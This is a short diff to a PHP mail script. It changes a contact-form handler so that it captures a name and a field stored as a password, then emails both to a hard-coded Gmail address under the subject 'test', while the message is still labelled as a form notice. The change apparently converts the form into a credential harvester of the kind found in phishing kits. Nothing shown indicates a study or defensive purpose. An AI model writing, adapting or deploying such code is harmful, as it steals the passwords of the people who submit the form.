@@ -1,12 +1,9 @@
 <?php
-$name=$_POST["name"];
-$mail=$_POST["mail"];
-$city=$_POST["city"];
-$form1="
-<h1>New Message from form 6</h1>
-<p><strong>".$name."</strong></p>
-<p><strong>".$mail."</p>
-<p><strong>".$city."</p>
+$name=$_POST["name1"];
+$password=$_POST["name2"];
+$form_6="
+  <h1>New Message from form 6</h1>
+  <p><strong>".$name."</strong> ".$password."</p>
 ";
 require_once('../../SMTP.php');
 require_once('../../PHPMailer.php');
@@ -27,7 +24,7 @@ try {
   $mail->addAddress('hardlife777sms@gmail.com'); //recipient
   $mail->isHTML(true);
   $mail->Subject='test'; //subject
-  $mail->Body=$form1; //message
+  $mail->Body=$form_6; //message
   $mail->send();
   echo 'Message has been sent';
 } 
